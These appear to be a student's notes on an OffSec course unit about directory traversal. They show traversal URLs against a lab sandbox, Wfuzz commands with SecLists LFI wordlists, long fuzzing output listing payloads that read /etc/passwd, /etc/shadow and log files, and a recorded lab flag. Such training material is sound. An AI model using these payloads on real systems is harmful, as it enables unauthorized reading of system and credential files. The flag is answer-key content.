This Learning Unit covers the following Learning Objectives:

1. Understand how to successfully exploit Directory Traversal.
2. Understand how to implement Wordlists/Payload Lists.
3. Understand how to fuzz a potentially vulnerable parameter with Wfuzz.

Next, we'll practice directory traversal. We can access the directory traversal sandbox by starting theÂ _dirTravSandbox_Â machine from the Lab Control Panel. Once the machine launches, we can visit it on port 80 and learn more about the exploitation options available to us.


#### 9.5.1. Directory Traversal - Exploitation

Arriving atÂ `http://dirTravSandbox`, we'll find a few options to select from.

![[Pasted image 20240916204546.png]]

Although it's clear in this sandbox that each page is intentionally vulnerable to Directory Traversal, a real-world scenario would be less clear. Further, when we specify a value to theÂ pathÂ parameter, we will notice that spacing seems a bit "off". Because browsers render data without preserving spacing, we have wrapped whatever is included in theÂ pathÂ parameter with "<pre></pre>" HTML tags. However in the real world, we can get around this and preserve file spacing by inspecting files by right-clicking the page and selectingÂ _View Page Source_.

Further, our sandbox is configured such that we can experiment with both absolute and relative directory traversal exploits, with options for absolute pathing, relative pathing (with verbose error messages), and relative pathing (with suppressed error messages).

***A real-world case, unfortunately, may not display error messages to inform us of our next steps. This means we'll need to practice and prepare for a variety of potential directory traversal methodologies.***

We'll explore the Absolute Pathing page first.

Let's keep in mind that we should provide aÂ _path_Â parameter. An Absolute Path starts from the root file-system orÂ rootfsÂ for Unix-based systems, andÂ C:\Â for Windows-based systems. Our target atÂ http://dirTravSandbox/Â is a Unix-based system, and inside of the web root there is a file calledÂ `data.txt`. To access this file, we'll provide the valueÂ `/var/www/html/data.txt`Â to theÂ _path_Â parameter.


`http://dirtravsandbox/absolutePathing.php?path=/var/www/html/data.txt`
![[Pasted image 20240916205133.png]]

In the figure above, we have exploited poor input sanitization to theÂ _path_Â parameter to achieve directory traversal with absolute pathing and exfiltrated the information withinÂ data.txt.

Next, let's exploit our directory traversal using a relative path.Â relativePathingVerbose.phpÂ will serve our purposes because the input for theÂ _path_Â parameter has beenÂ _intentionally_Â poorly sanitized in an attempt to limit any exfiltrated data from the web-root. We can attempt to bypass this by providing traversal strings and moving backwards until we reach theÂ /etc/passwdÂ file.

`http://dirtravsandbox/relativePathingVerbose.php?path=../../../../../../../../etc/passwd`
![[Pasted image 20240916205302.png]]
At this point, we've exploited both relative and absolute directory traversals, even extracting values from the target operating system. Next, we'll learn how to automate data exfiltration and enumerate the target machine using a wordlist.

--------------
#### 9.5.2 Wordlist/Payload Lists

Our automated attempts will only be as effective as our wordlist. We will be usingÂ `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`Â from the SecLists[1](https://portal.offsec.com/courses/WEB-200-28380/learning/directory-traversal-attacks-30962/directory-traversal-sandbox-31291/directory-traversal-exploitation-31009#fn-local_id_555-1)Â project during this Learning Module.

-----------
#### 9.5.3. Fuzzing the Path Parameter

Now that we have successfully exploited a relative directory traversal, let's attempt to confirm which files are present on the machine in an automated manner usingÂ _Wfuzz_.[1](https://portal.offsec.com/courses/WEB-200-28380/learning/directory-traversal-attacks-30962/directory-traversal-sandbox-31291/wordlistpayload-lists-31022#fn-local_id_558-1)Â The output below demonstrates how we can use theÂ /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txtÂ wordlist to fuzz theÂ _path_Â parameter for many different system configuration paths. We can use this technique to enumerate the configuration of a target machine by determining which files are present and which are not.

Wfuzz can return a significant number of false positives, so let's start with a dry run to determine the average error rate before we enumerate our target machine.

In the command below, theÂ -cÂ parameter will instruct Wfuzz to display color in our terminal output window. TheÂ -zÂ parameter is our payload parameter, and we specify that our payloads for the "FUZZ" keyword will come from theÂ `LFI-Jhaddix.txtÂ file`.


```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://dirTravSandbox:80/relativePathing.php?path=../../../../../../../../../../FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dirTravSandbox:80/relativePathing.php?path=../../../../../../../../../../FUZZ
Total requests: 914

=====================================================================
ID           Response   Lines    Word       Chars       Payload                   
=====================================================================
000000007:   200        3 L      10 W       81 Ch       "%0a/bin/cat%20/etc/passwd"
000000004:   200        3 L      10 W       81 Ch       "%00/etc/passwd%00"
000000014:   200        3 L      10 W       81 Ch       "/../../../../../../../../%2A"
000000005:   200        3 L      10 W       81 Ch       "%00../../../../../../etc/shadow"
000000002:   200        3 L      10 W       81 Ch       "\...\\\...\\\...\\\"
000000026:   200        3 L      19 W       125 Ch     "/admin/install.php"
000000020:   200        3 L      10 W       81 Ch       "..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed"
000000022:   200        3 L      10 W       81 Ch       "..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow"
000000023:   200        3 L      10 W       81 Ch       "=3D ./... . .%2f.."
000000029:   200        3 L      10 W       81 Ch       "/apache2/logs/access.log"
000000021:   200        22 L     34 W       1007 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"
000000027:   200        3 L      10 W       81 Ch       "../../../administrator/inbox"
000000033:   200        3 L      10 W       81 Ch       "/apache/logs/access.log"
000000035:   200        3 L      10 W       81 Ch       "../../../../apache/logs/access.log"
000000036:   200        3 L      10 W       81 Ch       "../../../apache/logs/access.log"
000000037:   200        3 L      10 W       81 Ch       "../../apache/logs/access.log"
000000038:   200        3 L      10 W       81 Ch       "../apache/logs/access.log"
000000034:   200        3 L      10 W       81 Ch       "../../../../../apache/logs/access.log"
000000031:   200        3 L      10 W       81 Ch       "/apache2/logs/error.log"
000000028:   200        3 L      10 W       81 Ch       "/apache2/logs/access_log"
000000030:   200        3 L      10 W       81 Ch       "/apache2/logs/error_log"
000000032:   200        3 L      10 W       81 Ch       "/apache/logs/access_log"
000000039:   200        3 L      10 W       81 Ch       "/apache/logs/error_log"
000000041:   200        3 L      10 W       81 Ch       "../../../../../apache/logs/error.log"
000000045:   200        3 L      10 W       81 Ch       "../apache/logs/error.log"
000000052:   200        3 L      10 W       81 Ch       "/../../../../../../../../bin/id|"
000000051:   200        3 L      10 W       81 Ch       "/.bashrc"
000000050:   200        3 L      10 W       81 Ch       "/.bash_profile"
000000049:   200        3 L      10 W       81 Ch       "/.bash_history"   
...
```

We can filter out the most of the erroneous output by using theÂ `--hh`Â option to suppress the majority of erroneous response sizes. In this case, the average failure response sizes are `81 Ch`and `125 Ch`, so we will provide the values 81 and 125 to ourÂ `--hh`Â parameter next time we run it. There are times when an erroneous output is going to still be there, but this will prevent us from having hundreds of them at a time.

After filtering out errors using this technique, only relevant results will be displayed in the terminal output window when we use theÂ `--hc`Â option in Wfuzz.


```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[17Sep2024 01:05:04]-[/etc]                                                                                                                                                               
â””â”€# wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh 81,125 http://dirTravSandbox/relativePathing.php?path=../../../../../../../../../../../../FUZZ                           
********************************************************                                                                                                                                                    
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                                                                    
********************************************************                                                                                                                                                    
                                                                                                                                                                                                            
Target: http://dirTravSandbox/relativePathing.php?path=../../../../../../../../../../../../FUZZ                                                                                                             
Total requests: 922                                                                                                                                                                                         
                                                                                                                                                                                                            
=====================================================================                                                                                                                                       
ID           Response   Lines    Word       Chars       Payload                                                                                                                                             
=====================================================================                                                                                                                                       
                                                                                                                                                                                                            
000000023:   200        22 L     34 W       1007 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                                                                                            
000000020:   200        22 L     34 W       1007 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"                                                                               
000000016:   200        22 L     34 W       1007 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"                                                                 
000000133:   200        42 L     49 W       527 Ch      "/etc/group"                                                                                                                                        
000000130:   200        4 L      16 W       118 Ch      "/etc/fstab"                                                                                                                                        
000000124:   200        9 L      37 W       502 Ch      "/etc/apt/sources.list"                                                                                                                             
000000116:   200        230 L    1125 W     7305 Ch     "/etc/apache2/apache2.conf"                                                                                                                         
000000201:   200        10 L     26 W       255 Ch      "../../../../../../../../../../../../etc/hosts"                                                                                                     
000000200:   200        10 L     26 W       255 Ch      "/etc/hosts"                                                                                                                                        
000000241:   200        10 L     51 W       367 Ch      "/etc/motd"                                                                                                                                         
000000232:   200        5 L      15 W       108 Ch      "/etc/issue"                                                                                                                                        
000000231:   200        358 L    1060 W     8262 Ch     "/etc/init.d/apache2"                                                                                                                               
000000267:   200        22 L     34 W       1007 Ch     "../../../../../../../../etc/passwd"                                                                                                                
000000268:   200        22 L     34 W       1007 Ch     "../../../../../../../etc/passwd"                                                                                                                   
000000266:   200        22 L     34 W       1007 Ch     "../../../../../../../../../etc/passwd"                                                                                                             
000000269:   200        22 L     34 W       1007 Ch     "../../../../../../etc/passwd"                                                                                                                      
000000245:   200        23 L     71 W       575 Ch      "/etc/nsswitch.conf"                                                                                                                        
000000259:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                                               
000000264:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../etc/passwd"                                                                                               
000000265:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../etc/passwd"                                                                                                  
000000257:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"  
000000264:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../etc/passwd"                                                                                                       
000000265:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../etc/passwd"                                                                                                          
000000257:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                                                                                  
000000260:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                                                                           
000000262:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                                                 
000000256:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"                                                                               
000000261:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                                              
000000263:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../etc/passwd"                                                                                                    
000000255:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                                            
000000258:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                                                                            
000000253:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                             
000000252:   200        22 L     34 W       1007 Ch     "/etc/passwd"                                                                                                                               
000000254:   200        22 L     34 W       1007 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                                
000000249:   200        22 L     34 W       1007 Ch     "/../../../../../../../../../../etc/passwd"                                                                                                 
000000272:   200        22 L     34 W       1007 Ch     "../../../etc/passwd"                                                                                                                       
000000248:   200        22 L     34 W       1007 Ch     "/./././././././././././etc/passwd"                                                                                                         
000000270:   200        22 L     34 W       1007 Ch     "../../../../../etc/passwd"                                                                                                                 
000000306:   200        22 L     34 W       1007 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                                                                                
000000278:   200        22 L     34 W       1007 Ch     "etc/passwd"                                                                                                                                
000000271:   200        22 L     34 W       1007 Ch     "../../../../etc/passwd"                                                                                                                    
000000274:   200        22 L     34 W       1007 Ch     "../etc/passwd"                                                                                                                             
000000273:   200        22 L     34 W       1007 Ch     "../../etc/passwd"                                                                                                                          
000000394:   200        5 L      16 W       134 Ch      "/etc/resolv.conf"                                                                                                                          
000000492:   200        31 L     199 W      1185 Ch     "/proc/cpuinfo"                                                                                                                             
000000496:   200        27 L     154 W      3386 Ch     "/proc/mounts"                                                                                                                              
000000504:   200        58 L     144 W      1383 Ch     "/proc/self/status"                                                                                                                         
000000505:   200        4 L      33 W       266 Ch      "/proc/version"                                                                                                                             
000000495:   200        54 L     159 W      1500 Ch     "/proc/meminfo"                                                                                                                             
000000502:   200        3 L      10 W       102 Ch      "/proc/self/cmdline"                                                                                                                        
000000501:   200        20 L     74 W       566 Ch      "/proc/partitions"                                                                                                                          
000000499:   200        6 L      43 W       465 Ch      "/proc/net/route"                                                                                                                           
000000500:   200        16 L     227 W      2031 Ch     "/proc/net/tcp"                                                                                                                             
000000494:   200        4 L      15 W       106 Ch      "/proc/loadavg"   
000000498:   200        7 L      64 W       527 Ch      "/proc/net/dev"                                                                                                                            
000000497:   200        5 L      25 W       237 Ch      "/proc/net/arp"                                                                                                                            
000000493:   200        69 L     393 W      3494 Ch     "/proc/interrupts"                                                                                                                         
000000694:   200        3 L      10 W       29573 Ch    "/var/log/lastlog"                                                                                                                         
000000722:   200        5 L      19 W       161 Ch      "/var/log/pureftpd.log"                                                                                                                    
000000922:   200        22 L     34 W       1007 Ch     "///////../../../etc/passwd"  
```

We can now observe several verifiedÂ /etc/passwdÂ files on the target machine, since the erroneous output has been removed.


```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt http://dirtravsandbox/relativePathingVerbose.php?path=../../../../../../../../FUZZ

http://dirtravsandbox/relativePathingVerbose.php?path=../../../../../../../../etc/passwd
```


##### Labs
`OS{directory_traversalFlagTwo}`
![[Pasted image 20240916212747.png]]
Navigate to `http://dirtravsandbox/relativePathingVerbose.php?path=../../../../../../../../etc/passwd` to get field to fuzz

utilized highlighted word list
![[Pasted image 20240916212907.png]]
Ran this command and output into `lab1.txt`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[17Sep2024 01:28:31]-[/usr/share/seclists/Fuzzing/LFI]
â””â”€# wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt http://dirtravsandbox/relativePathingVerbose.php?path=../../../../../../../../FUZZ > lab1.txt
```
Ran this command to look for `pureftpd.log` file
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[17Sep2024 01:28:31]-[/usr/share/seclists/Fuzzing/LFI]
â””â”€# cat lab1.txt| grep pureftpd.log      
```
saw a bunch of `/var/log/pureftpd.log`
![[Pasted image 20240916213102.png]]
Navigated to `http://dirtravsandbox/relativePathingVerbose.php?path=../../../../../../../var/log/pureftpd.log`
![[Pasted image 20240916213142.png]]
